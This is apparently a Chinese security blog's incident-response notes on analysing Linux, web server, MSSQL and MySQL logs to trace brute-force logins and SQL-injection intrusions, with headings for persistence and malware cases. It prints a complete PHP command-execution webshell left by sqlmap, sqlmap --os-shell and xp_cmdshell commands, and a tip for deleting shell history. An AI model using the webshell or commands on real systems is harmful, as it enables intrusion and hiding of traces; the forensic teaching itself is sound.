<tr>
<td style="text-align:center">/var/log/cron</td>
<td style="text-align:center">记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/cups</td>
<td style="text-align:center">记录打印信息的日志</td>
</tr>
<tr>
<td style="text-align:center">/var/log/dmesg</td>
<td style="text-align:center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/mailog</td>
<td style="text-align:center">记录邮件信息</td>
</tr>
<tr>
<td style="text-align:center">/var/log/message</td>
<td style="text-align:center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td style="text-align:center">/var/log/btmp</td>
<td style="text-align:center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/lastlog</td>
<td style="text-align:center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/wtmp</td>
<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td style="text-align:center">/var/log/utmp</td>
<td style="text-align:center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td style="text-align:center">/var/log/secure</td>
<td style="text-align:center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody>
</table>
<p>比较重要的几个日志：<br>
登录失败记录：/var/log/btmp     //lastb<br>
最后一次登录：/var/log/lastlog  //lastlog<br>
登录成功记录: /var/log/wtmp     //last<br>
登录日志记录：/var/log/secure</p>
<p>​	目前登录用户信息：/var/run/utmp  //w、who、users</p>
<p>​	历史命令记录：history<br>
​	仅清理当前用户： history -c</p>
<h3 id="0x02-日志分析技巧">0x02 日志分析技巧</h3>
<h4 id="a-常用的shell命令">A、常用的shell命令</h4>
<p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
<p>小技巧：</p>
<p>1、grep显示前后几行信息:</p>
<pre><code>	标准unix/linux下的grep通过下面參数控制上下文：
​	grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行
​	grep -B 5 foo file 显示foo及前5行
​	grep -A 5 foo file 显示foo及后5行
​	查看grep版本号的方法是
​	grep -V
</code></pre>
<p>2、grep 查找含有某字符串的所有文件</p>
<pre><code>	grep -rn &quot;hello,world!&quot; 
	* : 表示当前目录所有文件，也可以是某个文件名
	-r 是递归查找
	-n 是显示行号
	-R 查找所有文件包含子目录
	-i 忽略大小写
</code></pre>
<p>3、如何显示一个文件的某几行：</p>
<pre><code>	cat input_file | tail -n +1000 | head -n 2000
	#从第1000行开始，显示2000行。即显示1000~2999行
</code></pre>
<p>4、find /etc -name init</p>
<pre><code>//在目录/etc中查找文件init
</code></pre>
<p>5、只是显示/etc/passwd的账户</p>
<pre><code>`cat /etc/passwd |awk  -F ':'  '{print $1}'`  
//awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。
</code></pre>
<p>6、sed -i '153,$d' .bash_history</p>
<pre><code>删除历史操作记录，只保留前153行
</code></pre>
<h4 id="b-日志分析技巧">B、日志分析技巧</h4>
<p><strong>A、/var/log/secure</strong></p>
<pre><code>1、定位有多少IP在爆破主机的root帐号：    
grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

定位有哪些IP在爆破：
grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c

爆破用户名字典是什么？
 grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}'|uniq -c|sort -nr
 
2、登录成功的IP有哪些： 	
grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

登录成功的日期、用户名、IP：
grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 

3、增加一个用户kali日志：
Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001
Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali
, shell=/bin/bash
Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali
#grep &quot;useradd&quot; /var/log/secure 

4、删除用户kali日志：
Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'
# grep &quot;userdel&quot; /var/log/secure

5、su切换用户：
Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)

sudo授权执行:
sudo -l
Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now
</code></pre>
<p><strong>2、/var/log/yum.log</strong></p>
<p>软件安装升级卸载日志：</p>
<pre><code>yum install gcc
yum install gcc

    [root@bogon ~]# more /var/log/yum.log

Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64
Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686
</code></pre>
<h1 id="web日志分析">Web日志分析</h1>
<h3 id="ox01-web日志">ox01  Web日志</h3>
<p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
<p>我们来看一条Apache的访问日志：</p>
<p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p>
<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p>
<p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p>
<h3 id="0x02-日志分析技巧-2">0x02 日志分析技巧</h3>
<p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
<p>常用分析工具：</p>
<p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p>
<p>Linux下，使用Shell命令组合查询分析。</p>
<p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
<p>Apache日志分析技巧：</p>
<pre><code>1、列出当天访问次数最多的IP命令：
cut -d- -f 1 log_file|uniq -c | sort -rn | head -20

2、查看当天有多少个IP访问：
awk '{print $1}' log_file|sort|uniq|wc -l

3、查看某一个页面被访问的次数：
grep &quot;/index.php&quot; log_file | wc -l

4、查看每一个IP访问了多少个页面：
awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file

5、将每个IP访问的页面数进行从小到大排序：
awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n

6、查看某一个IP访问了哪些页面：
grep ^111.111.111.111 log_file| awk '{print $1,$7}'

7、去掉搜索引擎统计当天的页面：
awk '{print $12,$1}' log_file | grep ^\&quot;Mozilla | awk '{print $2}' |sort | uniq | wc -l

8、查看2018年6月21日14时这一个小时内有多少IP访问:
awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l	
</code></pre>
<h3 id="0x03-日志分析案例">0x03 日志分析案例</h3>
<p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p>
<p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p>
<p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p>
<p>1、定位攻击源</p>
<p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003104843.png" alt="" loading="lazy"><br>
浏览器指纹：</p>
<p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p>
<p>2、搜索相关日志记录</p>
<p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003109898.png" alt="" loading="lazy"><br>
3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>
<p>A、攻击者访问首页和登录页<br>
B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx<br>
C、攻击者访问Xzuser.aspx<br>
D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）<br>
E、攻击者访问了图片木马</p>
<p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p>
<h3 id="0x04-日志统计分析技巧">0x04 日志统计分析技巧</h3>
<p>统计爬虫：</p>
<pre><code>```javascript
grep -E 'Googlebot|Baiduspider'  /www/logs/access.2019-02-23.log | awk '{ print $1 }' | sort | uniq
```
</code></pre>
<p>统计浏览器：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log | grep -v -E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq -c | sort -r -n | head -n 100		
```
</code></pre>
<p>IP 统计：</p>
<pre><code>```javascript
grep '23/May/2019' /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4}' | sort | uniq -c | sort -r -n | head -n 10
2206 219.136.134.13
1497 182.34.15.248
1431 211.140.143.100
1431 119.145.149.106
1427 61.183.15.179
1427 218.6.8.189
1422 124.232.150.171
1421 106.187.47.224
1420 61.160.220.252
1418 114.80.201.18			
```
</code></pre>
<p>统计网段：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;}' | sort | uniq -c | sort -r -n | head -n 200			
```
</code></pre>
<p>统计域名：</p>
<pre><code>```javascript
cat  /www/logs/access.2019-02-23.log |awk '{print $2}'|sort|uniq -c|sort -rn|more		
```
</code></pre>
<p>HTTP Status：</p>
<pre><code>```javascript
cat  /www/logs/access.2019-02-23.log |awk '{print $9}'|sort|uniq -c|sort -rn|more
5056585 304
1125579 200
7602 400
    5 301	
```
</code></pre>
<p>URL 统计：</p>
<pre><code>```javascript
cat  /www/logs/access.2019-02-23.log |awk '{print $7}'|sort|uniq -c|sort -rn|more			
```
</code></pre>
<p>文件流量统计：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more

grep ' 200 ' /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more			
```
</code></pre>
<p>URL访问量统计：</p>
<pre><code>```javascript
cat /www/logs/access.2019-02-23.log | awk '{print $7}' | egrep '\?|&amp;' | sort | uniq -c | sort -rn | more			
```
</code></pre>
<p>脚本运行速度：</p>
<p>查出运行速度最慢的脚本</p>
<pre><code>javascript
grep -v 0$ /www/logs/access.2019-02-23.log | awk -F '\&quot; ' '{print $4&quot; &quot; $1}' web.log | awk '{print $1&quot; &quot;$8}' | sort -n -k 1 -r | uniq &gt; /tmp/slow_url.txt			
</code></pre>
<p>IP, URL 抽取：</p>
<pre><code>javascript
tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '{print $1&quot; &quot;$7}'			
</code></pre>
<h1 id="mssql日志分析">MSSQL日志分析</h1>
<p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<h3 id="0x01-mssql日志分析">0x01 MSSQL日志分析</h3>
<p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003319570.png" alt="" loading="lazy"><br>
登录到SQL Server Management Studio，依次点击 管理--SQL Server 日志<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003325425.png" alt="" loading="lazy"><br>
双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003329189.png" alt="" loading="lazy"><br>
另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003334603.png" alt="" loading="lazy"><br>
日志分析案例：</p>
<p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003339349.png" alt="" loading="lazy"><br>
筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p>
<p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003344900.png" alt="" loading="lazy"></p>
<h3 id="0x02-sql注入入侵痕迹">0x02  SQL注入入侵痕迹</h3>
<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<p><code>sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
<p>HTTP通讯过程如下：</p>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、数据库表检查</p>
<p>2、检查xp_cmdshell等存储过程</p>
<p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p>
<p>`Exec master.dbo.xp_cmdshell 'whoami'</p>
<p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
<h1 id="mysql日志分析">MySQL日志分析</h1>
<p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<h3 id="0x01-mysql日志分析">0x01 Mysql日志分析</h3>
<p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p>
<pre><code>1、查看log配置信息
show variables like '%general%';
2、开启日志
SET GLOBAL general_log = 'On';
3、指定日志文件路径
#SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
</code></pre>
<p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p>
<pre><code>190604 14:46:14       14 Connect    root@localhost on 
           14 Init DB    test
           14 Query    SELECT * FROM admin WHERE id = 1
           14 Quit  `
</code></pre>
<p>我们按列来解析一下：</p>
<pre><code>第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。
第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。
第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。
第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。
</code></pre>
<h3 id="0x02-登录成功失败">0x02 登录成功/失败</h3>
<p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003459915.png" alt="" loading="lazy"><br>
MySQL中的log记录是这样子：</p>
<pre><code>Time                 Id        Command         Argument

190601 22:03:20	   98 Connect	root@192.168.204.1 on 
		   98 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		  103 Connect	mysql@192.168.204.1 on 
		  103 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  104 Connect	mysql@192.168.204.1 on 
		  104 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Connect	root@192.168.204.1 on 
		  101 Connect	root@192.168.204.1 on 
		  101 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		   99 Connect	root@192.168.204.1 on 
		   99 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		  105 Connect	mysql@192.168.204.1 on 
		  105 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Query	set autocommit=0
		  102 Connect	mysql@192.168.204.1 on 
		  102 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Quit	`
</code></pre>
<p>你知道在这个口令猜解过程中，哪个是成功的吗？</p>
<p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p>
<pre><code>190601 22:03:20     100 Connect	root@192.168.204.1 on 
	   100 Query	set autocommit=0
	   100 Quit
</code></pre>
<p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p>
<p>Navicat for MySQL登录：</p>
<pre><code>190601 22:14:07	  106 Connect	root@192.168.204.1 on 
		         106 Query	SET NAMES utf8
		         106 Query	SHOW VARIABLES LIKE 'lower_case_%'
		         106 Query	SHOW VARIABLES LIKE 'profiling'
		         106 Query	SHOW DATABASES
</code></pre>
<p>命令行登录：</p>
<pre><code>190601 22:17:25	  111 Connect	root@localhost on 
		         111 Query	select @@version_comment limit 1
190601 22:17:56	  111 Quit
</code></pre>
<p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p>
<p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p>
<p>登录失败的记录：</p>
<pre><code>102 Connect	mysql@192.168.204.1 on 
102 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
</code></pre>
<p>利用shell命令进行简单的分析：</p>
<pre><code>#有哪些IP在爆破？
grep  &quot;Access denied&quot; mysql.log |cut -d &quot;'&quot; -f4|uniq -c|sort -nr
     27 192.168.204.1

#爆破用户名字典都有哪些？
grep  &quot;Access denied&quot; mysql.log |cut -d &quot;'&quot; -f2|uniq -c|sort -nr
     13 mysql
     12 root
      1 root
      1 mysql

</code></pre>
<p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p>
<p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p>
<h3 id="0x03-sql注入入侵痕迹">0x03  SQL注入入侵痕迹</h3>
<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<p><code>sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
<p>HTTP通讯过程如下：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003489782.png" alt="" loading="lazy"><br>
创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p>
<pre><code>tmpbwyov.php：

&lt;?php $c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c.&quot; 2&gt;&amp;1\n&quot;;function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print &quot;&lt;pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;?&gt;`
</code></pre>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、检查网站目录下，是否存在一些木马文件：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003524540.png" alt="" loading="lazy"><br>
2、检查是否有UDF提权、MOF提权痕迹</p>
<p>检查目录是否有异常文件</p>
<p>mysql\lib\plugin</p>
<p>c:/windows/system32/wbem/mof/</p>
<p>检查函数是否删除</p>
<pre><code>`select * from mysql.func`
</code></pre>
<p>3、结合web日志分析。</p>
<h1 id="2021-07-23">2021-07-23</h1>
<h1 id="windows权限维持-隐藏篇">Windows权限维持--隐藏篇</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120176342.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120181835.png" alt="" loading="lazy"></p>
<h1 id="windows权限维持-后门篇">Windows权限维持--后门篇</h1>
<figure data-type="image" tabindex="23"><img src="https://jinqipiaopiao.github.io//post-images/1627120207491.png" alt="" loading="lazy"></figure>
<h1 id="第3篇linux权限维持-隐藏篇">第3篇：Linux权限维持--隐藏篇</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120228492.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120232518.png" alt="" loading="lazy"></p>
<h1 id="第4篇linux权限维持-后门篇">第4篇：Linux权限维持--后门篇</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120248943.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120253486.png" alt="" loading="lazy"></p>
<h1 id="第5篇三大渗透测试框架权限维持技术">第5篇：三大渗透测试框架权限维持技术</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120275343.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120279732.png" alt="" loading="lazy"></p>
<h1 id="第6篇常见webshell管理工具">第6篇：常见WebShell管理工具</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120299125.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120303339.png" alt="" loading="lazy"></p>
<h1 id="windows实战篇">Windows实战篇</h1>
<h1 id="第1篇ftp暴力破解">第1篇：FTP暴力破解</h1>
<figure data-type="image" tabindex="24"><img src="https://jinqipiaopiao.github.io//post-images/1627120628024.png" alt="" loading="lazy"></figure>
<h1 id="第2篇蠕虫病毒">第2篇：蠕虫病毒</h1>
<figure data-type="image" tabindex="25"><img src="https://jinqipiaopiao.github.io//post-images/1627120632018.png" alt="" loading="lazy"></figure>
<h1 id="第3篇勒索病毒">第3篇：勒索病毒</h1>
<figure data-type="image" tabindex="26"><img src="https://jinqipiaopiao.github.io//post-images/1627120635115.png" alt="" loading="lazy"></figure>
<h1 id="第4篇arp病毒">第4篇：ARP病毒</h1>
<figure data-type="image" tabindex="27"><img src="https://jinqipiaopiao.github.io//post-images/1627120638238.png" alt="" loading="lazy"></figure>
<h1 id="第5篇挖矿病毒一">第5篇：挖矿病毒（一）</h1>
<figure data-type="image" tabindex="28"><img src="https://jinqipiaopiao.github.io//post-images/1627120642365.png" alt="" loading="lazy"></figure>
<h1 id="第6篇挖矿病毒二">第6篇：挖矿病毒（二）</h1>
<figure data-type="image" tabindex="29"><img src="https://jinqipiaopiao.github.io//post-images/1627120646969.png" alt="" loading="lazy"></figure>
<h1 id="2021-07-24">2021-07-24</h1>
<h1 id="linux实战篇">Linux实战篇</h1>
<h1 id="第1篇ssh暴力破解">第1篇：SSH暴力破解</h1>
<figure data-type="image" tabindex="30"><img src="https://jinqipiaopiao.github.io//post-images/1627121171992.png" alt="" loading="lazy"></figure>
<h1 id="第2篇捕捉短连接">第2篇：捕捉短连接</h1>
<figure data-type="image" tabindex="31"><img src="https://jinqipiaopiao.github.io//post-images/1627121175260.png" alt="" loading="lazy"></figure>
<h1 id="第3篇挖矿病毒">第3篇：挖矿病毒</h1>
<figure data-type="image" tabindex="32"><img src="https://jinqipiaopiao.github.io//post-images/1627121178896.png" alt="" loading="lazy"></figure>
<h1 id="第4篇盖茨木马">第4篇：盖茨木马</h1>
<figure data-type="image" tabindex="33"><img src="https://jinqipiaopiao.github.io//post-images/1627121183106.png" alt="" loading="lazy"></figure>
<h1 id="第5篇ddos病毒">第5篇：DDOS病毒</h1>
<figure data-type="image" tabindex="34"><img src="https://jinqipiaopiao.github.io//post-images/1627121189128.png" alt="" loading="lazy"></figure>
<h1 id="web实战篇">Web实战篇</h1>
<h1 id="第1篇网站被植入webshell">第1篇：网站被植入Webshell</h1>
<figure data-type="image" tabindex="35"><img src="https://jinqipiaopiao.github.io//post-images/1627121200218.png" alt="" loading="lazy"></figure>
<h1 id="第3篇批量挂黑页">第3篇：批量挂黑页</h1>
<figure data-type="image" tabindex="36"><img src="https://jinqipiaopiao.github.io//post-images/1627121205029.png" alt="" loading="lazy"></figure>
<h1 id="第4篇新闻源网站劫持">第4篇：新闻源网站劫持</h1>
<figure data-type="image" tabindex="37"><img src="https://jinqipiaopiao.github.io//post-images/1627121210180.png" alt="" loading="lazy"></figure>
<h1 id="第5篇移动端劫持">第5篇：移动端劫持</h1>
<figure data-type="image" tabindex="38"><img src="https://jinqipiaopiao.github.io//post-images/1627121214432.png" alt="" loading="lazy"></figure>
<h1 id="第6篇搜索引擎劫持">第6篇：搜索引擎劫持</h1>
<figure data-type="image" tabindex="39"><img src="https://jinqipiaopiao.github.io//post-images/1627121218635.png" alt="" loading="lazy"></figure>
<h1 id="第7篇网站首页被篡改">第7篇：网站首页被篡改</h1>
<figure data-type="image" tabindex="40"><img src="https://jinqipiaopiao.github.io//post-images/1627121223338.png" alt="" loading="lazy"></figure>
<h1 id="第8篇管理员账号被篡改">第8篇：管理员账号被篡改</h1>
<figure data-type="image" tabindex="41"><img src="https://jinqipiaopiao.github.io//post-images/1627121227307.png" alt="" loading="lazy"></figure>
<h1 id="第9篇编辑器入侵事件">第9篇：编辑器入侵事件</h1>
<figure data-type="image" tabindex="42"><img src="https://jinqipiaopiao.github.io//post-images/1627121232740.png" alt="" loading="lazy"></figure>
<h1 id="2021-07-27">2021-07-27</h1>
<p>#XPath注入漏洞实战</p>
<p>0x00 什么是XPath<br>
XPath是W3C的一个标准。它最主要的目的是为了在XML1.0或XML1.1文档节点树中定位节点所设计。</p>
<p>目前有XPath1.0和XPath2.0两个版本。</p>
<p>XPath1.0<br>
Xpath1.0是1999年成为W3C标准，而XPath2.0标准的确立是在2007年。</p>
<p>XPath是一种表达式语言，它的返回值可能是节点，节点集合，原子值，以及节点和原子值的混合等。</p>
<p>Xpath2.0<br>
XPath2.0是XPath1.0的超集。</p>
<p>它是对XPath1.0的扩展，它可以支持更加丰富的数据类型，并且XPath2.0保持了对XPath1.0的相对很好的向后兼容性，几乎所有的XPath2.0的返回结果都可以和XPath1.0保持一样。</p>
<p>XPath 1.0 和 XPath 2.0 之间的区别包括：</p>
<p>基于序列而非节点集的新的数据模型<br>
绑定变量的能力，以前的变量绑定在宿主语言（XSLT）中<br>
